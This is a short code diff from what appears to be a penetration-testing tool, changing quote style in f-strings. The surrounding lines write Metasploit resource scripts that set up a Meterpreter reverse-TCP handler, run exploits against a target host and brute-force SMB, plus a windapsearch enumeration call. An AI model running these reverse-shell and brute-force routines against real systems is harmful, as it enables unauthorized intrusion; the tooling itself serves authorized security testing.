@@ -564,7 +564,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             config_file.write('use exploit/multi/handler\n')
             config_file.write('set payload windows/meterpreter/reverse_tcp\n')
             config_file.write(f'set LPORT {str(lport)}\n')
-            config_file.write(f'set LHOST {self.params['lhost']}\n')
+            config_file.write(f"set LHOST {self.params['lhost']}\n")
             config_file.write('exploit -j -z\n')
             config_file.write('setg DisablePayloadHandler 0\n')
 
@@ -585,7 +585,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             config_file.write(f'set RHOST {str(host)}\n')
             config_file.write('set payload windows/meterpreter/reverse_tcp\n')
             config_file.write(f'set LPORT {str(lport)}\n')
-            config_file.write(f'set LHOST {self.params['lhost']}\n')
+            config_file.write(f"set LHOST {self.params['lhost']}\n")
             config_file.write('exploit -j -z\n')
 
         def smb_brute(config_file, host, passwd_file, lhost, lport):
@@ -612,7 +612,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
                     config_file.write(f'set RHOST  {str(host)}\n')
                     config_file.write('set payload windows/meterpreter/reverse_tcp\n')
                     config_file.write(f'set LPORT {str(lport)}\n')
-                    config_file.write(f'set LHOST {self.params['lhost']}\n')
+                    config_file.write(f"set LHOST {self.params['lhost']}\n")
                     config_file.write('exploit -j -z\n')
 
         with open(file, 'w') as metarc_file:
@@ -1318,7 +1318,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             self.cmd(command)
             self.logcsv(f"windapsearch {command}")
             self.cmd(f"cat sessions/{self.params['rhost']}_windap.json | jq")
-            self.do_windapsearchscrapeusers(f'sessions/{self.params['rhost']}_windap.json')
+            self.do_windapsearchscrapeusers(f"sessions/{self.params['rhost']}_windap.json")
             return
 
         use_ntlm = input("    [!] Use NTLM auth? (y/n, default: n): ").strip().lower() or 'n'
